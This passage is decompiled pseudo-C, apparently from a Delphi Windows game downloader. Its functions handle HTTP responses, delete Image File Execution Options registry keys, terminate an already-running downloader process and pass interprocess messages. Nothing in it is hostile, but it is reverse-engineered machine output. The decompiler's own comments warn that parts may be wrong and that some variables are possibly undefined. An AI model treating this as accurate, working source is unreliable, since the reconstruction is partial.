  v23 = (Classes::TStream *)Idcustomhttpserver::TIdHTTPResponseInfo::TIdHTTPResponseInfo(ExceptionList);
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&savedregs;
  v13 = &loc_45615B;
  v12 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v12);
  Classes::TStream::SetPosition(v23, 0i64);
  v7 = sub_406C44(&v22);
  v21 = (_DWORD *)sub_434820(v23, v7, a4, a5);
  if ( v21 )
  {
    v11 = &savedregs;
    v10 = &loc_45613E;
    v9 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v9);
    v20 = (unsigned __int8 (__fastcall ***)(_DWORD, _DWORD **, int))sub_429640(*(_BYTE **)(v27 + 4), v21[2]);
    if ( v20 )
    {
      if ( (**v20)(v20, &v21, v25) )
      {
        v24 = 1;
        __writefsdword(0, (unsigned int)v9);
        v11 = (int *)&loc_456145;
        sub_405598(v21);
        __writefsdword(0, (unsigned int)v15);
        v17 = &loc_456162;
        sub_405598(v23);
      }
      else
      {
        sub_407968(&v18, L"Protocol error ", (_DWORD *)v21[2]);
        sub_433460(*off_467F18, v18, *(_DWORD *)(v27 + 8));
        System::__linkproc__ TryFinallyExit(v9, v10, v11);
        System::__linkproc__ TryFinallyExit(v12, v13, ExceptionList);
      }
    }
    else
    {
      sub_407968(&v19, L"Unmapped ", (_DWORD *)v21[2]);
      sub_433460(*off_467F18, v19, *(_DWORD *)(v27 + 8));
      System::__linkproc__ TryFinallyExit(v9, v10, v11);
      System::__linkproc__ TryFinallyExit(v12, v13, ExceptionList);
    }
  }
  else
  {
    sub_433460(*off_467F18, v22, *(_DWORD *)(v27 + 8));
    System::__linkproc__ TryFinallyExit(v12, v13, ExceptionList);
  }
  __writefsdword(0, (unsigned int)v15);
  v17 = &loc_45618C;
  sub_406CA4((int)&v18, 2);
  sub_406C44(&v22);
  return v24;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 455E40: using guessed type _DWORD __stdcall Idcustomhttpserver::TIdHTTPResponseInfo::TIdHTTPResponseInfo(_DWORD);
// 4561A4: using guessed type wchar_t aUnmapped[10];
// 4561C4: using guessed type wchar_t aProtocolError[16];
// 467F18: using guessed type int *off_467F18;

//----- (00456A00) --------------------------------------------------------
int sub_456A00()
{
  return Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
           cls_DownloaderInterprocessScheme_TXML_SelfServiceInstallerCommandLine,
           1,
           L"SelfServiceInstallerCommandLine");
}
// 429C90: using guessed type int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD);
// 45623C: using guessed type int (*cls_DownloaderInterprocessScheme_TXML_SelfServiceInstallerCommandLine[3])();
// 456A30: using guessed type wchar_t aSelfserviceins[32];

//----- (00456A70) --------------------------------------------------------
int __fastcall sub_456A70(int a1)
{
  return sub_429D30(a1, (int)L"Text", 0, 1);
}
// 456AA0: using guessed type wchar_t aText[5];

//----- (00456AB0) --------------------------------------------------------
int __fastcall sub_456AB0(int a1)
{
  int result; // eax

  nullsub_2(a1);
  result = sub_405568((int)cls_CrossPlatform_TList, 1);
  *(_DWORD *)(a1 + 36) = result;
  return result;
}
// 405840: using guessed type int __fastcall nullsub_2(_DWORD);
// 42296C: using guessed type int (*cls_CrossPlatform_TList[2])();

//----- (00456AE0) --------------------------------------------------------
int __fastcall sub_456AE0(int a1)
{
  sub_429C70(a1);
  return unknown_libname_94(a1 + 36);
}
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (00456B00) --------------------------------------------------------
char __fastcall sub_456B00(int a1, int *a2)
{
  char result; // al

  sub_429C60(a1, (int)a2);
  result = sub_40576C(a2, (int)cls_DownloaderInterprocessScheme_TXML_SelfServiceCommandLineFiles_FileName);
  if ( result )
    return sub_427F40(*(_DWORD **)(a1 + 36), (int)a2);
  return result;
}
// 4564EC: using guessed type int (*cls_DownloaderInterprocessScheme_TXML_SelfServiceCommandLineFiles_FileName[3])();

//----- (00456B60) --------------------------------------------------------
int __fastcall sub_456B60(int a1, unsigned __int16 *a2)
{
  return sub_429C00(a2, (int)&off_467E1C, 1);
}
// 467E1C: using guessed type wchar_t *off_467E1C;

//----- (00456B90) --------------------------------------------------------
int sub_456B90()
{
  return Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
           cls_DownloaderInterprocessScheme_TXML_SelfServiceCloseApplication,
           1,
           L"SelfServiceCloseApplication");
}
// 429C90: using guessed type int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD);
// 4566C4: using guessed type int (*cls_DownloaderInterprocessScheme_TXML_SelfServiceCloseApplication[3])();
// 456BC0: using guessed type wchar_t aSelfserviceclo[28];

//----- (00456C00) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
char __usercall sub_456C00@<al>(void *a1@<eax>, int a2@<edi>)
{
  unsigned int v3[2]; // [esp-24h] [ebp-4Ch] BYREF
  void **v4; // [esp-1Ch] [ebp-44h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-40h] BYREF
  void *v6; // [esp-14h] [ebp-3Ch]
  void **v7; // [esp-10h] [ebp-38h]
  unsigned int v8[2]; // [esp-Ch] [ebp-34h] BYREF
  void **v9; // [esp-4h] [ebp-2Ch]
  __int32 v10; // [esp+0h] [ebp-28h] BYREF
  int v11; // [esp+4h] [ebp-24h] BYREF
  int v12; // [esp+8h] [ebp-20h] BYREF
  int v13; // [esp+Ch] [ebp-1Ch]
  int System__AnsiString; // [esp+10h] [ebp-18h]
  Idthreadcomponent::TIdThreadComponent *v15; // [esp+14h] [ebp-14h]
  int v16; // [esp+18h] [ebp-10h] BYREF
  Registry::TRegistry *v17; // [esp+1Ch] [ebp-Ch] BYREF
  unsigned int v18; // [esp+20h] [ebp-8h]
  void *v19; // [esp+24h] [ebp-4h]
  void *savedregs; // [esp+28h] [ebp+0h] BYREF

  v10 = 0;
  v11 = 0;
  v12 = 0;
  v16 = 0;
  v19 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_456DAF;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  HIBYTE(v18) = 0;
  v17 = (Registry::TRegistry *)sub_441F30((int)&cls_RegistryUtil_TUnicodeRegistry, 1, 983103, 0);
  v7 = &savedregs;
  v6 = &loc_456D85;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_442980((int)v17, HKEY_LOCAL_MACHINE);
  sub_407968(&v16, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\", v19);
  if ( (unsigned __int8)Registry::TRegistry::KeyExists(v17, v16) )
  {
    v15 = (Idthreadcomponent::TIdThreadComponent *)sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_456D68;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    sub_44C5B0(*((HKEY *)v17 + 2), (void *)v16, (__int32)v15, a2);
    if ( (unsigned __int8)sub_441F90(v17, v16) )
    {
      sub_407968(
        &v12,
        L"Removed: SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ ",
        v19);
      sub_433BE0(*off_467F18, v12, (int)L"FixRegistry:");
      HIBYTE(v18) = 1;
    }
    else
    {
      sub_407968(
        &v11,
        L"Unable to delete: SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ ",
        v19);
      sub_433460(*off_467F18, v11, (int)L"FixRegistry:");
      HIBYTE(v18) = 2;
    }
    if ( *((_DWORD *)v15 + 2) - 1 >= 0 )
    {
      v13 = *((_DWORD *)v15 + 2);
      System__AnsiString = 0;
      do
      {
        sub_428E60(v15, System__AnsiString, &v10);
        sub_433BE0(*off_467F18, v10, (int)L"FixRegistry:");
        ++System__AnsiString;
        --v13;
      }
      while ( v13 );
    }
    __writefsdword(0, v3[0]);
    v4 = (void **)&loc_456D6F;
    sub_405598(v15);
    __writefsdword(0, v18);
    savedregs = &loc_456D8C;
    unknown_libname_94(&v17);
  }
  else
  {
    System::__linkproc__ TryFinallyExit(ExceptionList, v6, v7);
  }
  __writefsdword(0, v8[0]);
  v9 = (void **)&loc_456DB6;
  sub_406CA4((int)&v10, 3);
  sub_406C44(&v16);
  return HIBYTE(v18);
}
// 456D7F: bad sp value at call
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 441D10: using guessed type __int16 cls_RegistryUtil_TUnicodeRegistry;
// 456DCC: using guessed type wchar_t aSoftwareMicros_0[75];
// 456E70: using guessed type wchar_t aRemovedSoftwar[85];
// 456F28: using guessed type wchar_t aFixregistry[13];
// 456F50: using guessed type wchar_t aUnableToDelete[94];
// 467F18: using guessed type int *off_467F18;

//----- (00457270) --------------------------------------------------------
int __usercall sub_457270@<eax>(DWORD a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v5; // eax
  int v7; // [esp-10h] [ebp-30h]
  unsigned int v8[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v9; // [esp-4h] [ebp-24h]
  int v10; // [esp+0h] [ebp-20h] BYREF
  void *v11; // [esp+4h] [ebp-1Ch] BYREF
  int v12[4]; // [esp+8h] [ebp-18h] BYREF
  int v13; // [esp+18h] [ebp-8h]
  DWORD cchLength; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v13 = a2;
  cchLength = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4572E5;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_426A60(a1, &v10);
  v7 = v10;
  v5 = sub_438990(a3, a4, a5);
  sub_43BAF0(v5, v7, v12);
  sub_4391B0((unsigned __int8 *)v12, (volatile __int32 *)&v11, a3, a5);
  sub_407968((volatile __int32 *)v13, L"GameCenterV5_", v11);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_4572EC;
  return sub_406CA4((int)&v10, 2);
}
// 4572FC: using guessed type wchar_t aGamecenterv5[14];

//----- (00457320) --------------------------------------------------------
bool __usercall sub_457320@<al>(
        int a1@<eax>,
        void (__fastcall *a2)(__int64 *, char *)@<edx>,
        DWORD a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>)
{
  const WCHAR *v6; // eax
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  unsigned int v12; // [esp-38h] [ebp-A0h]
  struct _EXCEPTION_REGISTRATION_RECORD *v13; // [esp-30h] [ebp-98h] BYREF
  const wchar_t *v14; // [esp-2Ch] [ebp-94h]
  int *v15; // [esp-28h] [ebp-90h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-24h] [ebp-8Ch] BYREF
  void *v17; // [esp-20h] [ebp-88h]
  const wchar_t *v18; // [esp-1Ch] [ebp-84h]
  _DWORD v19[3]; // [esp-18h] [ebp-80h] BYREF
  unsigned int v20[2]; // [esp-Ch] [ebp-74h] BYREF
  int *v21; // [esp-4h] [ebp-6Ch]
  unsigned int v22; // [esp+4h] [ebp-64h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v23; // [esp+8h] [ebp-60h] BYREF
  int v24; // [esp+Ch] [ebp-5Ch] BYREF
  int *v25; // [esp+10h] [ebp-58h] BYREF
  void *v26; // [esp+14h] [ebp-54h] BYREF
  int v27; // [esp+18h] [ebp-50h] BYREF
  void *v28; // [esp+1Ch] [ebp-4Ch] BYREF
  int v29; // [esp+20h] [ebp-48h] BYREF
  void *v30; // [esp+24h] [ebp-44h] BYREF
  int v31; // [esp+28h] [ebp-40h] BYREF
  int v32; // [esp+2Ch] [ebp-3Ch] BYREF
  DWORD v33; // [esp+30h] [ebp-38h]
  char v34; // [esp+37h] [ebp-31h]
  Classes::TThread *v35; // [esp+38h] [ebp-30h] BYREF
  char v36; // [esp+3Fh] [ebp-29h] BYREF
  __int64 v37; // [esp+40h] [ebp-28h] BYREF
  DWORD dwProcessId; // [esp+4Ch] [ebp-1Ch] BYREF
  HANDLE hHandle; // [esp+50h] [ebp-18h]
  HWND hWnd; // [esp+54h] [ebp-14h]
  bool v41; // [esp+5Bh] [ebp-Dh]
  DWORD v42; // [esp+5Ch] [ebp-Ch]
  void (__fastcall *v43)(__int64 *, char *); // [esp+60h] [ebp-8h]
  int v44; // [esp+64h] [ebp-4h]
  int savedregs; // [esp+68h] [ebp+0h] BYREF

  v24 = 0;
  v23 = 0;
  v22 = 0;
  v27 = 0;
  v26 = 0;
  v25 = 0;
  v29 = 0;
  v28 = 0;
  v31 = 0;
  v30 = 0;
  v42 = a3;
  v43 = a2;
  v44 = a1;
  v21 = &savedregs;
  v20[1] = (unsigned int)&loc_4576BB;
  v20[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v20);
  v41 = 1;
  v6 = (const WCHAR *)sub_407790(a1);
  hWnd = FindWindowW(v6, 0);
  if ( hWnd )
  {
    dwProcessId = 0;
    GetWindowThreadProcessId(hWnd, &dwProcessId);
    if ( dwProcessId )
    {
      if ( GetCurrentProcessId() != dwProcessId )
      {
        hHandle = OpenProcess(0x100000u, 0, dwProcessId);
        if ( hHandle )
        {
          v19[2] = &savedregs;
          v19[1] = &loc_457699;
          v19[0] = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)v19);
          if ( v42 )
            v32 = sub_457990((int)&cls_DownloaderInterprocess_TSelfServiceClient, 1, v42, a4, a5);
          else
            v32 = 0;
          v18 = (const wchar_t *)&savedregs;
          v17 = &loc_457586;
          ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&ExceptionList);
          sub_4417B0(0, hWnd, 9, a4, a5, 0, 0, 0, 0);
          sub_423830(&v37);
          v34 = 0;
          v35 = sub_457840((Classes::TThread *)cls_DownloaderInterprocess_TSendMsgLoopThread, 1, (int)hWnd, &v37);
          v15 = &savedregs;
          v14 = (const wchar_t *)&loc_457569;
          v13 = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&v13);
          while ( WaitForSingleObject(hHandle, 0x32u) == 258 )
          {
            if ( v43 )
            {
              v43(&v37, &v36);
              if ( v36 )
              {
                v34 = 1;
                break;
              }
            }
            else if ( sub_423880(&v37, 30000i64) )
            {
              v34 = 1;
              break;
            }
            if ( v32 && sub_457C70(v32, 50i64) )
            {
              if ( sub_457AC0(v32, a4) )
                sub_457BD0(v32, 2000i64);
              unknown_libname_94(&v32);
            }
            if ( sub_423880((_QWORD *)v35 + 5, 5000i64) )
            {
              v34 = 1;
              break;
            }
          }
          __writefsdword(0, (unsigned int)v13);
          v15 = (int *)&loc_457570;
          unknown_libname_94(&v35);
          __writefsdword(0, (unsigned int)ExceptionList);
          v18 = (const wchar_t *)&loc_45758D;
          unknown_libname_94(&v32);
          v33 = WaitForSingleObject(hHandle, 0xAu);
          v41 = v33 != 258;
          if ( v34 )
          {
            if ( !v41 )
            {
              v18 = L"Trying to terminate PID=";
              sub_415178((int *)&v26, 0, v7, dwProcessId);
              v17 = v26;
              ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)L" WaitState=";
              sub_415178((int *)&v25, 0, v8, v33);
              v15 = v25;
              sub_4079F0(&v27, 4);
              sub_433BE0(*off_467F18, v27, (int)L"CloseRunningDownloader:");
              sub_44BB40(dwProcessId, a4, a5, a6);
              v33 = WaitForSingleObject(hHandle, 0x7D0u);
              v41 = v33 != 258;
              if ( v33 == 258 )
              {
                v14 = L"Failed to terminate PID=";
                sub_415178((int *)&v23, 0, v9, dwProcessId);
                v13 = v23;
                sub_415178((int *)&v22, 0, v10, v33);
                v12 = v22;
                sub_4079F0(&v24, 4);
                sub_433460(*off_467F18, v24, (int)L"CloseRunningDownloader:");
              }
            }
          }
          __writefsdword(0, v12);
          v13 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_4576A0;
          CloseHandle_0(hHandle);
        }
        else
        {
          unknown_libname_74(dwProcessId, &v28);
          sub_407968(&v29, L"OpenProcess failed. PID=", v28);
          sub_433940(*off_467F18, (void *)v29, (int)L"CloseRunningDownloader:", a4, a5, a6, 0);
        }
      }
    }
    else
    {
      unknown_libname_74(hWnd, &v30);
      sub_407968(&v31, L"Get window process id failed. HWND=", v30);
      sub_433940(*off_467F18, (void *)v31, (int)L"CloseRunningDownloader:", a4, a5, a6, 0);
    }
  }
  __writefsdword(0, v20[0]);
  v21 = (int *)&loc_4576C2;
  sub_406CA4((int)&v22, 10);
  return v41;
}
// 4575C9: variable 'v7' is possibly undefined
// 4575E0: variable 'v8' is possibly undefined
// 457642: variable 'v9' is possibly undefined
// 457659: variable 'v10' is possibly undefined
// 457687: variable 'v12' is possibly undefined
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 457140: using guessed type __int16 cls_DownloaderInterprocess_TSelfServiceClient;
// 457208: using guessed type int (*cls_DownloaderInterprocess_TSendMsgLoopThread[2])();
// 4576D8: using guessed type wchar_t aGetWindowProce[36];
// 45772C: using guessed type wchar_t aCloserunningdo[24];
// 457768: using guessed type wchar_t aOpenprocessFai_0[25];
// 4577A8: using guessed type wchar_t aTryingToTermin[25];
// 4577E8: using guessed type wchar_t aWaitstate[12];
// 45780C: using guessed type wchar_t aFailedToTermin[25];
// 467F18: using guessed type int *off_467F18;
// 457320: using guessed type __int64 var_28;
// 457320: using guessed type Classes::TThread *var_30;

//----- (00457840) --------------------------------------------------------
Classes::TThread *__fastcall sub_457840(Classes::TThread *a1, char a2, int a3, _DWORD *a4)
{
  int v5; // [esp+0h] [ebp-Ch]
  char v6; // [esp+7h] [ebp-5h]
  Classes::TThread *v7; // [esp+8h] [ebp-4h]

  if ( a2 )
    a1 = (Classes::TThread *)System::__linkproc__ ClassCreate();
  v5 = a3;
  v6 = a2;
  v7 = a1;
  sub_43DC30(a1, 0, 0, 2000);
  *((_DWORD *)v7 + 12) = v5;
  *((_DWORD *)v7 + 10) = *a4;
  *((_DWORD *)v7 + 11) = a4[1];
  *((_DWORD *)v7 + 9) = 10;
  if ( v6 )
    System::__linkproc__ AfterConstruction(v7);
  return v7;
}
// 457852: variable 'a3' is possibly undefined
// 457855: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);

//----- (004578C0) --------------------------------------------------------
_DWORD *__fastcall sub_4578C0(int *a1)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v3; // [esp-4h] [ebp-14h]
  __int64 v4; // [esp+0h] [ebp-10h] BYREF
  const WCHAR *v5; // [esp+8h] [ebp-8h] BYREF
  int *v6; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v5 = 0;
  v6 = a1;
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_457942;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_405514(*a1, (int)&v5);
  sub_427100(v5);
  while ( !*((_BYTE *)v6 + 13) )
  {
    SendMessageW_0((HWND)v6[12], 0, 0, 0);
    sub_423830(&v4);
    *((_QWORD *)v6 + 5) = v4;
    Sleep_0(5u);
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_457949;
  return sub_406C44(&v5);
}

//----- (00457950) --------------------------------------------------------
int __stdcall sub_457950(int a1, int a2)
{
  unknown_libname_173(a1, a2);
  return sub_455F10();
}
// 455F10: using guessed type int sub_455F10(void);
// 457DF0: using guessed type _DWORD __stdcall unknown_libname_173(_DWORD, _DWORD);

//----- (00457990) --------------------------------------------------------
int __usercall sub_457990@<eax>(int a1@<eax>, char a2@<dl>, DWORD a3@<ecx>, int a4@<edi>, int a5@<esi>)
{
  int v5; // eax
  int v6; // eax
  int v7; // eax
  unsigned int v9[2]; // [esp-1Ch] [ebp-30h] BYREF
  int *v10; // [esp-14h] [ebp-28h]
  int v11; // [esp+4h] [ebp-10h] BYREF
  DWORD v12; // [esp+8h] [ebp-Ch]
  char v13; // [esp+Fh] [ebp-5h]
  int v14; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v11 = 0;
  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v12 = a3;
  v13 = a2;
  v14 = a1;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_457A97;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_405568(a1, 0);
  v5 = sub_428540((int)cls_CrossPlatform_TCriticalSection, 1);
  *(_DWORD *)(v14 + 36) = v5;
  v6 = sub_405568((int)&cls_InterComDispatchUtil_TICXmlDispatchMap, 1);
  *(_DWORD *)(v14 + 32) = v6;
  sub_457950((int)sub_457D00, v14);
  Guitesting::TGUITestCase::Hide(v14 + 8, 20);
  sub_457270(v12, (int)&v11, 0, a4, a5);
  sub_406FE8((volatile __int32 *)(v14 + 28), v11);
  *(_DWORD *)(v14 + 20) = 7;
  *(_DWORD *)(v14 + 24) = GetCurrentProcessId();
  *(_DWORD *)(v14 + 12) = ++dword_46F6AC;
  v7 = sub_4556B0(
         (int)&cls_InterComClientUtil_TICClient,
         1,
         *(_DWORD *)(v14 + 28),
         (_DWORD *)(v14 + 8),
         v14,
         (int)sub_457D60,
         *(_DWORD *)(v14 + 36));
  *(_DWORD *)(v14 + 4) = v7;
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_457A9E;
  sub_406C44(&v11);
  if ( v13 )
    System::__linkproc__ AfterConstruction(v14);
  return v14;
}
// 4579A8: variable 'a3' is possibly undefined
// 4579AB: variable 'a2' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4231F0: using guessed type int (*cls_CrossPlatform_TCriticalSection[3])();
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 455110: using guessed type __int16 cls_InterComClientUtil_TICClient;
// 455CFC: using guessed type __int16 cls_InterComDispatchUtil_TICXmlDispatchMap;
// 46F6AC: using guessed type int dword_46F6AC;

//----- (00457AC0) --------------------------------------------------------
char __usercall sub_457AC0@<al>(int a1@<eax>, int a2@<edi>)
{
  _DWORD *v3; // [esp+0h] [ebp-Ch]

  v3 = (_DWORD *)sub_456B90();
  return sub_457B30(a1, v3, a2);
}

//----- (00457AF0) --------------------------------------------------------
char __usercall sub_457AF0@<al>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v3; // eax
  _DWORD *v5; // [esp+0h] [ebp-10h]

  v5 = (_DWORD *)sub_456A00();
  v3 = sub_456A70((int)v5);
  sub_429E10(v3, a2);
  return sub_457B30(a1, v5, a3);
}

//----- (00457B30) --------------------------------------------------------
char __usercall sub_457B30@<al>(int a1@<eax>, _DWORD *a2@<edx>, int a3@<edi>)
{
  __int16 *v3; // eax
  _DWORD *v5; // [esp-10h] [ebp-20h]
  unsigned int v6[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v7; // [esp-4h] [ebp-14h]
  _DWORD *v8; // [esp+0h] [ebp-10h]
  char v9; // [esp+7h] [ebp-9h]
  _DWORD *v10; // [esp+8h] [ebp-8h]
  int v11; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = a2;
  v11 = a1;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 36));
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_457BBA;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  *(_BYTE *)(v11 + 40) = 0;
  v5 = off_4681E0;
  v3 = &cls_InterComUtil_TICMessageMemoryStreamData;
  sub_454D30(1, v10, a3);
  if ( &cls_InterComUtil_TICMessageMemoryStreamData )
    v3 = &cls_InterComUtil_TICMessageMemoryStreamData + 8;
  v8 = (_DWORD *)sub_454C40((int)&cls_InterComUtil_TICMessage, 1, 3, v5, (int)v3, 0, 0, 0);
  v9 = sub_455AA0(*(_DWORD *)(v11 + 4), v8);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_457BC1;
  sub_428600(*(_DWORD *)(v11 + 36));
  return v9;
}
// 454098: using guessed type __int16 cls_InterComUtil_TICMessageMemoryStreamData;
// 45427C: using guessed type __int16 cls_InterComUtil_TICMessage;
// 4681E0: using guessed type void *off_4681E0;

//----- (00457BD0) --------------------------------------------------------
char __fastcall sub_457BD0(int a1, __int64 a2)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v6; // [esp-8h] [ebp-18h]
  int *v7; // [esp-4h] [ebp-14h]
  __int64 v8; // [esp+0h] [ebp-10h] BYREF
  char v9; // [esp+Bh] [ebp-5h]
  int v10; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = a1;
  v9 = 0;
  sub_423830(&v8);
  while ( sub_4559C0(*(_DWORD *)(v10 + 4)) )
  {
    sub_4285F0(*(int (__fastcall ****)(_DWORD))(v10 + 36));
    v7 = &savedregs;
    v6 = &loc_457C3A;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    if ( *(_BYTE *)(v10 + 40) )
    {
      v9 = 1;
      System::__linkproc__ TryFinallyExit(ExceptionList, v6, v7);
      return v9;
    }
    __writefsdword(0, (unsigned int)ExceptionList);
    v7 = (int *)&loc_457C41;
    sub_428600(*(_DWORD *)(v10 + 36));
    Sleep_0(0xAu);
    if ( sub_423880(&v8, a2) )
      return v9;
  }
  return v9;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 457BD0: using guessed type __int64 var_10;

//----- (00457C70) --------------------------------------------------------
char __fastcall sub_457C70(int a1, __int64 a2)
{
  __int64 v5; // [esp+0h] [ebp-10h] BYREF
  char v6; // [esp+Bh] [ebp-5h]
  int v7; // [esp+Ch] [ebp-4h]

  v7 = a1;
  v6 = 0;
  sub_423830(&v5);
  while ( !sub_4559C0(*(_DWORD *)(v7 + 4)) )
  {
    Sleep_0(0xAu);
    if ( sub_423880(&v5, a2) )
      return v6;
  }
  return 1;
}
// 457C70: using guessed type __int64 var_10;

//----- (00457CC0) --------------------------------------------------------
int __fastcall sub_457CC0(int a1)
{
  unknown_libname_94(a1 + 4);
  unknown_libname_94(a1 + 32);
  unknown_libname_94(a1 + 36);
  return nullsub_3(a1);
}
// 405844: using guessed type int __fastcall nullsub_3(_DWORD);
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);

//----- (00457D00) --------------------------------------------------------
char __fastcall sub_457D00(int a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  int v5; // [esp+0h] [ebp-Ch]
  char v6; // [esp+7h] [ebp-5h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = a2;
  v7 = a1;
  v6 = 1;
  sub_4285F0(*(int (__fastcall ****)(_DWORD))(a1 + 36));
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_457D49;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  *(_BYTE *)(v7 + 40) = 1;
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_457D50;
  sub_428600(*(_DWORD *)(v7 + 36));
  return v6;
}

//----- (00457D60) --------------------------------------------------------
char __usercall sub_457D60@<al>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  unsigned int v4[2]; // [esp-18h] [ebp-24h] BYREF
  int *v5; // [esp-10h] [ebp-1Ch]
  unsigned int v6[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v7; // [esp-4h] [ebp-10h]
  char v8; // [esp+3h] [ebp-9h]
  _DWORD *v9; // [esp+4h] [ebp-8h]
  int v10; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = (_DWORD *)a2;
  v10 = a1;
  v8 = 1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_457DDB;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( *(_BYTE *)(a2 + 28) == 3 )
  {
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_457DBE;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    sub_455FD0(*(_DWORD *)(v10 + 32), (int)v9, 0, a3, 6, (int)off_467FD0);
